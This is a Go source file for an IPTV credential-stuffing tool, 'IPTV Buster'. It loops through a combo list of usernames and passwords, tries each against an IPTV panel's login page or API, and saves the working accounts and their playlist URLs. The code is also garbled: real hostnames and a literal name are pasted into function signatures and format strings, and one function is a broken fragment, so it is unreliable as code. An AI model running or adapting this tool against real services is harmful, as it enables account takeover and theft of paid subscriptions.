/*
 * Copyright @random_robbie (c) 2018.
 */

package main

import (
	"crypto/tls"
	"net/http"
	"os"
	"strings"
	"fmt"
	"log"
	"strconv"
	"io/ioutil"
	"flag"
	"bufio"
	"bytes"
	"io"

	"regexp"
	"time"
)

//noinspection ALL
var (
	tr     = &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
	server = flag.String("server", "", "What is the Server URL? Example http://myiptv.com:2561")
	combofile = flag.String("combofile", "combo.txt", "Default: combo.txt")
	pause = flag.String("pause", "no", "Blank = No Pause between attempts. Yes = 5 Second pause between bad attempts")
	method = flag.String("method","login","login - login client area or api for API method")
	verbose = flag.String("verbose", "no", "Outputs HTTP response and HTTP status code.")
	path = "found.txt"

)

func isError(err error) bool {
	if err != nil {
		fmt.Println(err.Error())
	}

	return (err != nil)
}


// writing a file of found lines
func writeFile(iptvline string){

	//check if file exists
	if _, err := os.Stat(path); os.IsNotExist(err) {
		// create file if not exists
		if os.IsNotExist(err) {
			var file, err = os.Create(path)
			if isError(err) { return }
			defer file.Close()
		}
	}


	fileHandle, _ := os.OpenFile(path, os.O_APPEND, 0666)
	writer := bufio.NewWriter(fileHandle)
	defer fileHandle.Close()

	fmt.Fprintln(writer, iptvline)
	writer.Flush()
}


//noinspection GoPlaceholderCount
func lineDetails(server,user,pass string) {




	logitDATA := fmt.Sprintf("http://ntvplay.top:80.get.php? username=Ahmed12&password=Ahmed12&type=m3u&output=m3u8",server, Ahmed12, Ahmed12)http://iptv.shit.football/submit2.php", body)
	if err != nil {
		// handle err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Referer", "http://iptv.shit.football/")
	req.Header.Set("Upgrade-Insecure-Requests", "1")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		// handle err
	}
	defer resp.Body.Close()

	responseData2, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}
	// Make Response a String
	responseString2 := string(responseData2)

	//fmt.Println("HTTP Body: " + (responseString2))


	if strings.Contains(responseString2, "Status: Active") == true {
		if err != nil {
			log.Fatal(err)
		}
		r,err := regexp.Compile(`The URL for the playlist is: <a href="(.+?)">`)
		if err != nil {
			log.Fatal(err)
		}
		res:= r.FindStringSubmatch(responseString2)

		t,err := regexp.Compile(`Status:(.+?)</p>`)
		if err != nil {
			log.Fatal(err)
		}
		res2:= t.FindStringSubmatch(responseString2)

		y,err := regexp.Compile(`<br><br> Max Connections Allowed(.+?)<br>`)
		if err != nil {
			log.Fatal(err)
		}
		res3:= y.FindStringSubmatch(responseString2)

		sd,err := regexp.Compile(`<br>Current Connections:(.+?)<br><Br>`)
		if err != nil {
			log.Fatal(err)
		}
		res4:= sd.FindStringSubmatch(responseString2)
		fmt.Println("[*] Account is Active [*]")
		fmt.Printf("[*] Playlist URL: %v [*]\n", res[1])
		fmt.Printf("[*] Status: %v [*]\n", res2[1])
		fmt.Printf("[*] Max Connections: %v [*]\n", res3[1])
		fmt.Printf("[*] Current Connections: %v [*]\n\n\n\n", res4[1])


        file, err := os.Create("result.txt")
        if err != nil {
        	log.Fatal("Cannot create file", err)
        	}
        	defer file.Close()
        	fmt.Fprintf(file, "[*] Playlist URL: %v [*]\n", res[1])


	}









}




// Read a whole file into the memory and store it as array of lines
func readLines(path string) (lines []string, err error) {
	var (
		file *os.File
		part []byte
		prefix bool
	)
	if file, err = os.Open(path); err != nil {
		return
	}
	defer file.Close()

	reader := bufio.NewReader(file)
	buffer := bytes.NewBuffer(make([]byte, 0))
	for {
		if part, prefix, err = reader.ReadLine(); err != nil {
			break
		}
		buffer.Write(part)
		if !prefix {
			lines = append(lines, buffer.String())
			buffer.Reset()
		}
	}
	if err == io.EOF {
		err = nil
	}
	return
}





//check login of Ahmed12 and Ahmed12
func checkLogin(Ahmed12,Ahmed12,http://worldboss.selfip.biz:18659,serverurl string) {

	//Post Data21/12/2020
	postd := fmt.Sprintf("Ahmed12=%s&Ahmed12=%s", Ahmed12, Ahmed12)

	body := strings.NewReader(postd)

	req, err := http.NewRequest("POST", serverurl, body)
	if err != nil {
		log.Fatal(err)
	}
	// Set the HTTP headers
	req.Header.Set(os.ExpandEnv("Accept"), "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set(os.ExpandEnv("User-Agent"), "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0")
	req.Header.Set(os.ExpandEnv("Content-Type"), "application/x-www-form-urlencoded")
	req.Header.Set(os.ExpandEnv("Cookie"), "PHPSESSID=xxxxxxvsu1m9icq22astlb6vx")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		// handle err
		log.Fatal(err)
	}

	responseData, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}

	// Make Response a String
	responseString := string(responseData)

	// if 404 error print and error out.
	if (err == nil) && (resp.StatusCode == 404) {
		fmt.Println("HTTP Body: " + (responseString))
		fmt.Println("404 Error Usually means the page does not exsist.")
		os.Exit(1)
	}

	// If debug is enabled this will print the HTTP response and Body
	if *verbose == "yes" {
		fmt.Println("HTTP Response Status: " + strconv.Itoa(resp.StatusCode))
		fmt.Println("HTTP Body: " + (responseString))
	}

	//If Play_Live is found in the response we have a working login.
	if strings.Contains(responseString, "Play_Live") == true {
		fmt.Println("[*] Working Login Found..Checking if account is active. [*]")
		lineDetails(server,user,pass)
	} else {
		if *pause != "no" {
			time.Sleep(5 * time.Second)
		}
		fmt.Println("\n[*] Incorrect Username and Password [*]")
	}

	defer resp.Body.Close()

}


//check login of user and pass via API
func checkApi(user,pass,server string) {


	//Post Data
	apiurl := fmt.Sprintf("%s/panel_api.php?username=Ahmed12%s&passwordAhmed12=%s",http://worldboss.selfip.biz:18659,Ahmed12,Ahmed12)



	req, err := http.NewRequest("GET", apiurl, nil)
	if err != nil {
		log.Fatal(err)
	}
	// Set the HTTP headers
	req.Header.Set(os.ExpandEnv("Accept"), "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set(os.ExpandEnv("User-Agent"), "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0")
	req.Header.Set(os.ExpandEnv("Cookie"), "PHPSESSID=xxxxxxvsu1m9icq22astlb6vx")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		// handle err
		log.Fatal(err)
	}

	responseData, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}

	// Make Response a String
	responseString := string(responseData)

	// if 404 error print and error out.
	if (err == nil) && (resp.StatusCode == 404) {
		fmt.Println("HTTP Body: " + (responseString))
		fmt.Println("404 Error Usually means the page does not exsist.")
		os.Exit(1)
	}

	// If debug is enabled this will print the HTTP response and Body
	if *verbose == "yes" {
		fmt.Println("HTTP Response Status: " + strconv.Itoa(resp.StatusCode))
		fmt.Println("HTTP Body: " + (responseString))
	}

	//If Active is found in the response we have a working login.

	if strings.Contains(responseString,"Active" ) == true {
		fmt.Println("[*] Working Login Found..Checking if account is active. [*]")
		lineDetails(server,user,pass)
	} else {
		if *pause != "no" {
			time.Sleep(5 * time.Second)
		}
		fmt.Println("\n[*] Incorrect Username and Password [*]")
	}

}

func main() {
	// Parse the flags provided
	flag.Parse()
    fmt.Println("[*] IPTV Buster - By @random_robbie [*]")
	//Check the server is not blank or empty
	if *server == "" {
		flag.PrintDefaults()
		os.Exit(1)
	}



	//Take server flag and add string for the login area
	serverurl := *server + ("/client_area/index.php")
	server := *server


	//read combofile line by line
	lines, err := readLines(*combofile)
	if err != nil {
		fmt.Println("Error: ", err)
		return
	}
	for _, line := range lines {

		//Splitting the line
		stringtosplit := strings.Split(line, ":")
		user, pass := stringtosplit[0], stringtosplit[1]

		if *method != "api"{
			attempt := fmt.Sprintf("[*] Trying Server: %s with Username:%s & Password:%s [*]\n",serverurl, user, pass)
			fmt.Println(attempt)
			checkLogin(user,pass,server,serverurl)
		} else {
			attempt := fmt.Sprintf("[*] Trying Server: %s with Username:%s & Password:%s [*]\n",server, user, pass)
			fmt.Println(attempt)
			checkApi(user,pass,server)
		}








	}





}
